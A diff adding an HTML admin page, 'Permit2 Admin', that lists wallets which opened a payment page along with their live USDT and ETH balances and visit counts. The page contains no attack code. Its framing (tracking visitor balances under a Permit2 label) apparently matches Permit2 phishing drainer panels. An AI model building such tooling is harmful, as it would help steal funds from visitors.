@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wallets</title>
+  <link rel="stylesheet" href="/css/admin.css" />
+</head>
+<body>
+  <div class="shell">
+    <aside class="sidebar">
+      <div class="brand">Permit2 Admin</div>
+      <nav class="nav">
+        <a href="/admin/">Dashboard</a>
+        <a href="/admin/wallets.html" class="active">Wallets</a>
+        <a href="/admin/payments.html">Payments</a>
+        <a href="/admin/settings.html">Settings</a>
+        <a href="/" target="_blank">Payment page</a>
+        <a href="#" id="logout">Log out</a>
+      </nav>
+    </aside>
+    <main class="main">
+      <h1 class="page-title">Connected wallets</h1>
+      <p class="page-sub">Wallets that opened the payment page. Balances are live from chain.</p>
+      <div class="grid" id="list">
+        <div class="card"><h3>Loading…</h3></div>
+      </div>
+    </main>
+  </div>
+  <script type="module">
+    import { requireLogin, api, clearToken, shortAddr } from '/js/admin.js';
+    if (!requireLogin()) throw new Error('auth');
+    document.getElementById('logout').onclick = (e) => {
+      e.preventDefault();
+      clearToken();
+      location.href = '/admin/login.html';
+    };
+
+    const list = document.getElementById('list');
+    try {
+      const { wallets } = await api('/api/wallets');
+      if (!wallets?.length) {
+        list.innerHTML = '<div class="card"><h3>None yet</h3><div class="meta">Connect a wallet on the payment page</div></div>';
+      } else {
+        list.innerHTML = wallets.map((w) => `
+          <div class="card wallet">
+            <h3>Wallet</h3>
+            <div class="addr">${w.address}</div>
+            <div class="value" style="font-size:1.15rem">${w.usdtBalance != null ? w.usdtBalance : '—'} USDT</div>
+            <div class="meta">ETH: ${w.ethBalance != null ? Number(w.ethBalance).toFixed(6) : '—'}</div>
+            <div class="meta">Seen ${w.connect_count || 1}× · Last ${new Date(w.last_seen_at).toLocaleString()}</div>
+          </div>
+        `).join('');
+      }
+    } catch (e) {
+      list.innerHTML = `<div class="card"><h3>Error</h3><div class="meta">${e.message}</div></div>`;
+    }
+  </script>
+</body>
+</html>
